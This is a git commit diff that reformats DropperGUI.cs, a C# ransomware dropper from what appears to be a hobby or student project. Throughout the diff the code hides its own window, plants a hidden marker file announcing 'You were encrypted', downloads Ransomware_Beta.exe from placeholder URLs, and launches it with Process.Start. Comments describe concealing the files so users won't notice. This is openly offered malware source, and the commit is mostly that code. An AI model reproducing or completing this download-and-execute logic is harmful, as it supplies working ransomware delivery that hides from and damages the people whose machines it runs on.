05ca0b6992071fb3cde2ca53e9b83adbd4ff3b5e
Ali Ibrahim <allosheribraheem38@gmail.com>
2021-07-30 18:54:18 +0300

    reformate droppergui.cs

--- Dropper/DropperGUI.cs
+++ Dropper/DropperGUI.cs
@@ -23,34 +23,32 @@ public partial class DropperGUI : Form {
   /// </summary>
   public DropperGUI() {
     InitializeComponent();
+    this.TransparencyKey = this.BackColor; // Make invisible
     StartAction();
   }
   private void StartAction() {
     this.Close();
-    // First determine whether the virus has already infected the operating
-    // system or not This functionality will depend on how the virus announce it
-    // has already infected a certain folder This might be done by adding a new
-    // file to the "host" directory, not decided yet Create a new Folder for the
-    // ransomware
-
+    /**
+     * First determine whether the virus has already infected the operating
+     * system or not This functionality will depend on how the virus announce it
+     * has already infected a certain folder This might be done by adding a new
+     * file to the "host" directory, not decided yet Create a new Folder for the
+     * ransomware
+     */
     // Create Folder
     Directory.CreateDirectory(pathToInfect + "\\Malware");
-
     // Add the signature file if not exist
-    var directoryInfected =
-        File.Exists(pathToInfect + "\\Malware\\README.txt");
-
+    var directoryInfected = File.Exists(pathToInfect + "\\Malware\\README.txt");
     if (!directoryInfected) {
       // create the folder and the text file in the path C:\Program
-      // Filesx86\timestamp.txt P.S : make both the file and the folder hidden so
-      // that a regular user won't notice.
+      // Filesx86\timestamp.txt P.S : make both the file and the folder hidden
+      // so that a regular user won't notice.
       StreamWriter writer =
           new StreamWriter(pathToInfect + @"\Malware\README.txt");
       writer.Write("You were encrypted by Ali & Leen, good luck...^^");
       File.SetAttributes(pathToInfect + @"\Malware\README.txt",
                          FileAttributes.Hidden);
     }
-
     // if it already exists it means a previous version of the virus infected
     // the OS then launch the virus by downloading it from a malicious site
     String link = "https://www.some-site.com";
@@ -58,7 +56,6 @@ public partial class DropperGUI : Form {
     // After finishing the downloading, start the ransomware virus and terminate
     Process.Start(pathToInfect + @"\Malware\Ransomware_Beta.exe");
   }
-
   // DownLoadFileInBackground2
   public static void DownLoadFileInBackground2(string address) {
     // Make protocol for donwload file from github
@@ -70,8 +67,8 @@ public partial class DropperGUI : Form {
     client.DownloadFileCompleted +=
         new AsyncCompletedEventHandler(DownloadFileCallback2);
     // Specify a progress notification handler here ...
-    client.DownloadFileAsync(uri, pathToInfect +
-                                      @"\Malware\Ransomware_Beta.exe");
+    client.DownloadFileAsync(uri,
+                             pathToInfect + @"\Malware\Ransomware_Beta.exe");
   }
   private static void DownloadFileCallback2(object sender,
                                             AsyncCompletedEventArgs e) {
@@ -86,20 +83,17 @@ public partial class DropperGUI : Form {
   }
   public static void DownLoadLocalFileInBackground() {
 
-            try
-            {
-                WebClient webClient = new WebClient();
-                webClient.DownloadFile("URl to local server",
-                                       @"C:\Program Files\System32\Ransomware_Beta.exe");
-            }
-            catch (WebException e)
-            {
-                LaunchLocally();
-            }
-    }
-
-    private static void LaunchLocally() {
-      Process.Start(pathToInfect + @"\Malware\local\Ransomware_Beta.exe");
+    try {
+      WebClient webClient = new WebClient();
+      webClient.DownloadFile("URl to local server",
+                             @"C:\Program Files\System32\Ransomware_Beta.exe");
+    } catch (WebException e) {
+      LaunchLocally();
     }
   }
+
+  private static void LaunchLocally() {
+    Process.Start(pathToInfect + @"\Malware\local\Ransomware_Beta.exe");
+  }
+}
 }
